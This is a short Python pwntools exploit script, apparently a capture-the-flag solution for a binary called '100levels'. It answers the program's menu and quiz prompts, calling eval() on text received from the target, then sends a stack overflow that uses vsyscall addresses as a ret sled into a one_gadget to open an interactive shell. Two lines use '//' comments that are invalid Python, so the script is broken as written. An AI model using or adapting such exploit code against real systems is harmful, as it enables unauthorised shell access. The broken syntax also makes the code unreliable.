'''
partial write leak libcbase address

'''

from pwn import *
libc = ELF('libc.so')

one_gadget = 0x4526a
vsyscall_gettimeofday = 0xffffffffff600000

def answer():
    p.recvuntil('Question: ')
    answer = eval(p.recvuntil(' = ')[:-3])
    p.recvuntil('Answer:')
    p.sendline(str(answer))



p = process('100levels')
p.recvuntil('Choice:\n')
p.send('2')
p.recvuntil('Choice:\n')
p.send('1')
p.recv()
p.send('0')
p.recv()
p.send(str(one_gadget - libc.symbols['system'] ))   //onegadget address 


for i in range(1,100):
    log.info(i)
    answer()

p.recv()
p.send('a'*0x38 + p64(vsyscall_gettimeofday)*3)  //ret 3 times -> ongadget
p.interactive()

